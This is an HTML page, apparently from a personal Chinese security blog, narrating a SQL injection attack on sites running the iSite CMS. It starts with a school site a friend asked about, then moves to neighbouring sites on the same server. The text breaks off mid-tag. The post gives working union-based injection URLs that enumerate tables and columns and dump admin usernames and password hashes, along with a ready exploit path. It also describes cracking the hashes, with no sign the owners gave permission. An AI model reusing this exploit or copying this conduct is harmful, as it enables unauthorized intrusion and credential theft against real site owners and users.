@@ -1,0 +1,1191 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。
+我这么菜，还是去看看吧。。。。打开主站
+访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）
+'>
+<title>意外性的发现一套cms的注入漏洞</title>
+
+<link rel='canonical' href='https://360rce.github.io/p/xaef7i9f/'>
+
+<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='意外性的发现一套cms的注入漏洞'>
+<meta property='og:description' content='事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。
+我这么菜，还是去看看吧。。。。打开主站
+访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）
+'>
+<meta property='og:url' content='https://360rce.github.io/p/xaef7i9f/'>
+<meta property='og:site_name' content='iceH&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='渗透实战' /><meta property='article:tag' content='原创文章' /><meta property='article:published_time' content='2017-11-03T09:19:25&#43;00:00'/><meta property='article:modified_time' content='2017-11-03T09:19:25&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg' />
+<meta name="twitter:title" content="意外性的发现一套cms的注入漏洞">
+<meta name="twitter:description" content="事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。
+我这么菜，还是去看看吧。。。。打开主站
+访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）
+"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<style>
+    :root {
+     
+    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
+    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
+    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
+  }
+</style>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+         document.head.appendChild(customFont);
+}());
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended">
+
+
+        <aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hue92896558ee730c67dc59b841139d134_363585_300x0_resize_box_3.png" width="300"
+                            height="333" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">iceH&#39;s Blog</a></h1>
+            <h2 class="site-description">一条啥也不会的咸鱼！</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M456 32h-304C121.1 32 96 57.13 96 88v320c0 13.22-10.77 24-24 24S48 421.2 48 408V112c0-13.25-10.75-24-24-24S0 98.75 0 112v296C0 447.7 32.3 480 72 480h352c48.53 0 88-39.47 88-88v-304C512 57.13 486.9 32 456 32zM464 392c0 22.06-17.94 40-40 40H139.9C142.5 424.5 144 416.4 144 408v-320c0-4.406 3.594-8 8-8h304c4.406 0 8 3.594 8 8V392zM264 272h-64C186.8 272 176 282.8 176 296S186.8 320 200 320h64C277.3 320 288 309.3 288 296S277.3 272 264 272zM408 272h-64C330.8 272 320 282.8 320 296S330.8 320 344 320h64c13.25 0 24-10.75 24-24S421.3 272 408 272zM264 352h-64c-13.25 0-24 10.75-24 24s10.75 24 24 24h64c13.25 0 24-10.75 24-24S277.3 352 264 352zM408 352h-64C330.8 352 320 362.8 320 376s10.75 24 24 24h64c13.25 0 24-10.75 24-24S421.3 352 408 352zM400 112h-192c-17.67 0-32 14.33-32 32v64c0 17.67 14.33 32 32 32h192c17.67 0 32-14.33 32-32v-64C432 126.3 417.7 112 400 112z"></path></svg>
+                
+                <span>文章</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 32H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h448c35.35 0 64-28.65 64-64V96C576 60.65 547.3 32 512 32zM176 128c35.35 0 64 28.65 64 64s-28.65 64-64 64s-64-28.65-64-64S140.7 128 176 128zM272 384h-192C71.16 384 64 376.8 64 368C64 323.8 99.82 288 144 288h64c44.18 0 80 35.82 80 80C288 376.8 280.8 384 272 384zM496 320h-128C359.2 320 352 312.8 352 304S359.2 288 368 288h128C504.8 288 512 295.2 512 304S504.8 320 496 320zM496 256h-128C359.2 256 352 248.8 352 240S359.2 224 368 224h128C504.8 224 512 231.2 512 240S504.8 256 496 256zM496 192h-128C359.2 192 352 184.8 352 176S359.2 160 368 160h128C504.8 160 512 167.2 512 176S504.8 192 496 192z"></path></svg>
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M464 96h-192l-64-64h-160C21.5 32 0 53.5 0 80V160h512V144C512 117.5 490.5 96 464 96zM0 432C0 458.5 21.5 480 48 480h416c26.5 0 48-21.5 48-48V192H0V432z"></path></svg>
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M500.3 443.7l-119.7-119.7c27.22-40.41 40.65-90.9 33.46-144.7C401.8 87.79 326.8 13.32 235.2 1.723C99.01-15.51-15.51 99.01 1.724 235.2c11.6 91.64 86.08 166.7 177.6 178.9c53.8 7.189 104.3-6.236 144.7-33.46l119.7 119.7c15.62 15.62 40.95 15.62 56.57 0C515.9 484.7 515.9 459.3 500.3 443.7zM79.1 208c0-70.58 57.42-128 128-128s128 57.42 128 128c0 70.58-57.42 128-128 128S79.1 278.6 79.1 208z"></path></svg>
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512" fill="#BDBDBF"><path d="M352 128c0 70.7-57.3 128-128 128s-128-57.3-128-128S153.3 0 224 0s128 57.3 128 128zM0 482.3C0 383.8 79.8 304 178.3 304h91.4C368.2 304 448 383.8 448 482.3c0 16.4-13.3 29.7-29.7 29.7H29.7C13.3 512 0 498.7 0 482.3zM609.3 512H471.4c5.4-9.4 8.6-20.3 8.6-32v-8c0-60.7-27.1-115.2-69.8-151.8c2.4-.1 4.7-.2 7.1-.2h61.4C567.8 320 640 392.2 640 481.3c0 17-13.8 30.7-30.7 30.7zM432 256c-31 0-59-12.6-79.3-32.9C372.4 196.5 384 163.6 384 128c0-26.8-6.6-52.1-18.3-74.3C384.3 40.1 407.2 32 432 32c61.9 0 112 50.1 112 112s-50.1 112-112 112z"></path></svg>
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 160C202.9 160 160 202.9 160 256s42.92 96 96 96c53.08 0 96-42.92 96-96S309.1 160 256 160zM256 288C238.3 288 224 273.7 224 256s14.33-32 32-32c17.67 0 32 14.33 32 32S273.7 288 256 288zM256 0c-141.4 0-256 114.6-256 256s114.6 256 256 256c141.4 0 256-114.6 256-256S397.4 0 256 0zM256 384c-70.75 0-128-57.25-128-128s57.25-128 128-128s128 57.25 128 128S326.8 384 256 384z"></path></svg>
+					
+                    
+                    
+                    <span>暗色</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/xaef7i9f/">
+                
+                    <img src="https://w.wallhaven.cc/full/yx/wallhaven-yx9xvg.jpg" loading="lazy" alt="Featured image of post 意外性的发现一套cms的注入漏洞" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%8D%97%E9%A3%8E%E7%9F%A5%E6%88%91%E6%84%8F/" >
+                南风知我意
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/xaef7i9f/">意外性的发现一套cms的注入漏洞</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
+                
+                <time class="article-time--published">2017/11/03</time>
+            </div>
+        
+
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
+                
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>事情是这样的，在一个老司机的群里聊天。。。。（是真的开车群）一个朋友说想叫我去检测下他们学校官网。</p>
+<p><img src="/p/xaef7i9f/01.png"
+	width="439"
+	height="362"
+	srcset="/p/xaef7i9f/01_hu62b3925b6e8ce009f8ba20e3d7f76e60_32543_480x0_resize_box_3.png 480w, /p/xaef7i9f/01_hu62b3925b6e8ce009f8ba20e3d7f76e60_32543_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="121"
+		data-flex-basis="291px"
+	
+></p>
+<p>我这么菜，还是去看看吧。。。。打开主站</p>
+<p><img src="/p/xaef7i9f/02.png"
+	width="1141"
+	height="562"
+	srcset="/p/xaef7i9f/02_hu1072b3399996b6c3daa47c9917ee1626_450294_480x0_resize_box_3.png 480w, /p/xaef7i9f/02_hu1072b3399996b6c3daa47c9917ee1626_450294_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="487px"
+	
+></p>
+<p>访问robots.txt文件，是存在的，可以看出是isite的cms（在此之前听都没听过….）</p>
+<p><img src="/p/xaef7i9f/03.png"
+	width="243"
+	height="163"
+	srcset="/p/xaef7i9f/03_huf5dfe9f90792663e53bb04c5d992fe67_2639_480x0_resize_box_3.png 480w, /p/xaef7i9f/03_huf5dfe9f90792663e53bb04c5d992fe67_2639_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="149"
+		data-flex-basis="357px"
+	
+></p>
+<p>去百度了下看下有啥公开的漏洞吧</p>
+<p><img src="/p/xaef7i9f/04.png"
+	width="650"
+	height="845"
+	srcset="/p/xaef7i9f/04_huaca76807d494a0a3a60aad588afa92f3_129624_480x0_resize_box_3.png 480w, /p/xaef7i9f/04_huaca76807d494a0a3a60aad588afa92f3_129624_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="76"
+		data-flex-basis="184px"
+	
+></p>
+<p>不得不说。。。用的人真的少，这些漏洞都试了下，都没用啊。</p>
+<p>还是看看后台吧，后面加个admin，得到后台之，各种弱口令，都没结果。</p>
+<p><img src="/p/xaef7i9f/05.png"
+	width="728"
+	height="346"
+	srcset="/p/xaef7i9f/05_hua670b4292d3b97b17a1733a5d394cfb2_39614_480x0_resize_box_3.png 480w, /p/xaef7i9f/05_hua670b4292d3b97b17a1733a5d394cfb2_39614_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="504px"
+	
+></p>
+<p>竟然这样，从旁站下手好了。查了下，有这么多</p>
+<p><img src="/p/xaef7i9f/06.png"
+	width="1047"
+	height="789"
+	srcset="/p/xaef7i9f/06_hu55d2e05bd8f3d12ecb26af87a25d9017_90209_480x0_resize_box_3.png 480w, /p/xaef7i9f/06_hu55d2e05bd8f3d12ecb26af87a25d9017_90209_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="318px"
+	
+></p>
+<p>我一个个找过去……全是这套程序。。我也很无奈啊</p>
+<p><img src="/p/xaef7i9f/07.png"
+	width="1387"
+	height="839"
+	srcset="/p/xaef7i9f/07_hu55f53384775dde62e8dce4a2998e28ee_263740_480x0_resize_box_3.png 480w, /p/xaef7i9f/07_hu55f53384775dde62e8dce4a2998e28ee_263740_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="165"
+		data-flex-basis="396px"
+	
+></p>
+<p>没办法，硬着头皮看了看主站，随便点了个连接貌似伪静态啊。试了半天还是放弃了。</p>
+<p><img src="/p/xaef7i9f/08.png"
+	width="503"
+	height="67"
+	srcset="/p/xaef7i9f/08_hu114ec0ecc8c97fb716915e634cd1d93d_57439_480x0_resize_box_3.png 480w, /p/xaef7i9f/08_hu114ec0ecc8c97fb716915e634cd1d93d_57439_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="750"
+		data-flex-basis="1801px"
+	
+></p>
+<p>继续翻其他站，在一个站的首页发现这个。</p>
+<p><img src="/p/xaef7i9f/09.png"
+	width="240"
+	height="97"
+	srcset="/p/xaef7i9f/09_huf8f9781d6f3591e556f9a90cf4d0feed_7103_480x0_resize_box_3.png 480w, /p/xaef7i9f/09_huf8f9781d6f3591e556f9a90cf4d0feed_7103_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<p>尝试下post注入。加个单引号</p>
+<p><img src="/p/xaef7i9f/10.png"
+	width="287"
+	height="172"
+	srcset="/p/xaef7i9f/10_hu150a1cb0c4d89dc5e7ff4a3eee88a3b7_4416_480x0_resize_box_3.png 480w, /p/xaef7i9f/10_hu150a1cb0c4d89dc5e7ff4a3eee88a3b7_4416_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="400px"
+	
+></p>
+<p>好吧 刚准备放弃….过了几秒钟 自动跳转到到了另一个页面</p>
+<p><img src="/p/xaef7i9f/11.png"
+	width="817"
+	height="767"
+	srcset="/p/xaef7i9f/11_hu64318fc8a77843eb4068aa0c3ef32e53_265692_480x0_resize_box_3.png 480w, /p/xaef7i9f/11_hu64318fc8a77843eb4068aa0c3ef32e53_265692_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="106"
+		data-flex-basis="255px"
+	
+></p>
+<p>继续在搜索框那输入了些查询内容点击检索</p>
+<p><img src="/p/xaef7i9f/12.png"
+	width="457"
+	height="141"
+	srcset="/p/xaef7i9f/12_hu76ec2c6c3aca38de78fc77088eae0e4a_3933_480x0_resize_box_3.png 480w, /p/xaef7i9f/12_hu76ec2c6c3aca38de78fc77088eae0e4a_3933_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="324"
+		data-flex-basis="777px"
+	
+></p>
+<p><img src="/p/xaef7i9f/13.png"
+	width="630"
+	height="768"
+	srcset="/p/xaef7i9f/13_hue00be99fbcbb5316700d26e6503b1bba_215779_480x0_resize_box_3.png 480w, /p/xaef7i9f/13_hue00be99fbcbb5316700d26e6503b1bba_215779_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="82"
+		data-flex-basis="196px"
+	
+></p>
+<p>Search后面多了个24，怪我手贱去加个个单引号………报错了（头一次人品爆发）</p>
+<p><img src="/p/xaef7i9f/14.png"
+	width="1001"
+	height="507"
+	srcset="/p/xaef7i9f/14_hu5b93da220b70cbe69fae68ae2be33e28_196220_480x0_resize_box_3.png 480w, /p/xaef7i9f/14_hu5b93da220b70cbe69fae68ae2be33e28_196220_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="197"
+		data-flex-basis="473px"
+	
+></p>
+<p>And 1=1 和and 1=2返回结果</p>
+<p><img src="/p/xaef7i9f/15.png"
+	width="882"
+	height="741"
+	srcset="/p/xaef7i9f/15_hu11604dfb93602d0c1ad9d985393ca507_387277_480x0_resize_box_3.png 480w, /p/xaef7i9f/15_hu11604dfb93602d0c1ad9d985393ca507_387277_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="285px"
+	
+></p>
+<p><img src="/p/xaef7i9f/16.png"
+	width="818"
+	height="804"
+	srcset="/p/xaef7i9f/16_hu2055b8ab0ed21493532d8010e5a9f7c3_280406_480x0_resize_box_3.png 480w, /p/xaef7i9f/16_hu2055b8ab0ed21493532d8010e5a9f7c3_280406_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="101"
+		data-flex-basis="244px"
+	
+></p>
+<p>确定已经存在注入，这次就用手工注入吧。</p>
+<p>先order by猜下字段长度</p>
+<p><a class="link" href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010"  target="_blank" rel="noopener"
+    >http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010</a>  返回正常</p>
+<p><a class="link" href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011"  target="_blank" rel="noopener"
+    >http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011</a> 返回错误</p>
+<p><a class="link" href="http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10"  target="_blank" rel="noopener"
+    >http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10</a>结果如下</p>
+<p><img src="/p/xaef7i9f/17.png"
+	width="1052"
+	height="731"
+	srcset="/p/xaef7i9f/17_hu6dec4bbc22ecabb79b8a123e29a5295f_462538_480x0_resize_box_3.png 480w, /p/xaef7i9f/17_hu6dec4bbc22ecabb79b8a123e29a5295f_462538_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="143"
+		data-flex-basis="345px"
+	
+></p>
+<p>没有显错位啊，加个and 1=2试试</p>
+<p><img src="/p/xaef7i9f/18.png"
+	width="412"
+	height="138"
+	srcset="/p/xaef7i9f/18_huc1408ea180b276733d6fb14515a97b7d_4987_480x0_resize_box_3.png 480w, /p/xaef7i9f/18_huc1408ea180b276733d6fb14515a97b7d_4987_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="298"
+		data-flex-basis="716px"
+	
+></p>
+<p>显错位替换成database()和version()，版本是5.0以上，有个默认数据库information</p>
+<p><img src="/p/xaef7i9f/19.png"
+	width="530"
+	height="121"
+	srcset="/p/xaef7i9f/19_hu3581b5c868f2bfced96c5ec9f27af0e6_17280_480x0_resize_box_3.png 480w, /p/xaef7i9f/19_hu3581b5c868f2bfced96c5ec9f27af0e6_17280_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="438"
+		data-flex-basis="1051px"
+	
+></p>
+<p>User(),不是root权限</p>
+<p><img src="/p/xaef7i9f/20.png"
+	width="204"
+	height="57"
+	srcset="/p/xaef7i9f/20_hu53d0601a283176081f346f13f2cae120_1688_480x0_resize_box_3.png 480w, /p/xaef7i9f/20_hu53d0601a283176081f346f13f2cae120_1688_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="357"
+		data-flex-basis="858px"
+	
+></p>
+<p>接下来查表名</p>
+<p><a class="link" href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat%28table_name%29,3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D"  target="_blank" rel="noopener"
+    >http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D</a>(这是数据库的hex码，xxx代表马赛克……)</p>
+<p>​    <img src="/p/xaef7i9f/21.png"
+	width="1467"
+	height="181"
+	srcset="/p/xaef7i9f/21_hue1d9b09c96fcab3c7845bb052c24f8dc_12274_480x0_resize_box_3.png 480w, /p/xaef7i9f/21_hue1d9b09c96fcab3c7845bb052c24f8dc_12274_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="810"
+		data-flex-basis="1945px"
+	
+></p>
+<p>出来很多啊，用审查元素全部复制下来</p>
+<p>flexi_announcement,flexi_bbcode,flexi_channel,flexi_channel_config,flexi_config,flexi_content,flexi_content_subject,flexi_feedback,flexi_file,flexi_file_watermark,flexi_inquiry,flexi_link,flexi_link_category,flexi_log,flexi_message,flexi_page,flexi_search_cache,flexi_tag,flexi_tag_related,flexi_tpl_block,flexi_user,flexi_user_admin,flexi_u</p>
+<p>起初以为是flexi_user_admin这个表，后来发现帐号密码存在flexi_user这个表中</p>
+<p>接下来查他字段</p>
+<p><a class="link" href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat%28column_name%29,3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572"  target="_blank" rel="noopener"
+    >http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572</a></p>
+<p>​    <img src="/p/xaef7i9f/22.png"
+	width="1352"
+	height="230"
+	srcset="/p/xaef7i9f/22_hucac2f4f441b85b9304e611ca64afa7f4_13496_480x0_resize_box_3.png 480w, /p/xaef7i9f/22_hucac2f4f441b85b9304e611ca64afa7f4_13496_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="587"
+		data-flex-basis="1410px"
+	
+></p>
+<p>id,name,password,hit_question,hit_answer,email,real_name,gender,birthday,province,address,post_code,phone_code,mphone_code,group_id,reg_time,last_login_time,last_login_ip,login_count,post_count,manager,locked,new_msg_count,memo</p>
+<p>经验判断存放帐号密码的字段是name和password</p>
+<p><a class="link" href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user"  target="_blank" rel="noopener"
+    >http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user</a></p>
+<p>​    <img src="/p/xaef7i9f/23.png"
+	width="580"
+	height="112"
+	srcset="/p/xaef7i9f/23_hu8a1547b9430fdcc74f2981f9e593ed27_4729_480x0_resize_box_3.png 480w, /p/xaef7i9f/23_hu8a1547b9430fdcc74f2981f9e593ed27_4729_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="517"
+		data-flex-basis="1242px"
+	
+></p>
+<p>就这样，帐号密码已经出来了</p>
+<p>利用构造出来的exp:</p>
+<p><code>index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,pass word,9,10%20from%20flexi_user</code></p>
+<p>去主站访问下</p>
+<p>​     <img src="/p/xaef7i9f/24.png"
+	width="558"
+	height="212"
+	srcset="/p/xaef7i9f/24_hud37cab214e7965655c22c2c4486f0610_10643_480x0_resize_box_3.png 480w, /p/xaef7i9f/24_hud37cab214e7965655c22c2c4486f0610_10643_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="263"
+		data-flex-basis="631px"
+	
+></p>
+<p>哈哈  帐号密码到手 数了一下是40位…….然后去百度看了看</p>
+<p>​     <img src="/p/xaef7i9f/25.png"
+	width="582"
+	height="594"
+	srcset="/p/xaef7i9f/25_hude4f4ea1b6459dc1d35979689f4d5430_113319_480x0_resize_box_3.png 480w, /p/xaef7i9f/25_hude4f4ea1b6459dc1d35979689f4d5430_113319_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="97"
+		data-flex-basis="235px"
+	
+></p>
+<p>………..说是md5的  然后我仔细看了看文章…..屌用都没  我去官网下载了套源码</p>
+<p>查看代码发现是sha1加密</p>
+<p>​     <img src="/p/xaef7i9f/26.png"
+	width="786"
+	height="50"
+	srcset="/p/xaef7i9f/26_hu334d9f8028f6531dcbf3fdd7f230f0ec_53978_480x0_resize_box_3.png 480w, /p/xaef7i9f/26_hu334d9f8028f6531dcbf3fdd7f230f0ec_53978_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1572"
+		data-flex-basis="3772px"
+	
+></p>
+<p>拿起密码就去cmd5.com解密，悲剧来了………</p>
+<p>​     <img src="/p/xaef7i9f/27.png"
+	width="631"
+	height="282"
+	srcset="/p/xaef7i9f/27_hu61e49fa9946542cd6b28d559417631c5_8392_480x0_resize_box_3.png 480w, /p/xaef7i9f/27_hu61e49fa9946542cd6b28d559417631c5_8392_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="意外性的发现一套cms的注入漏洞"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
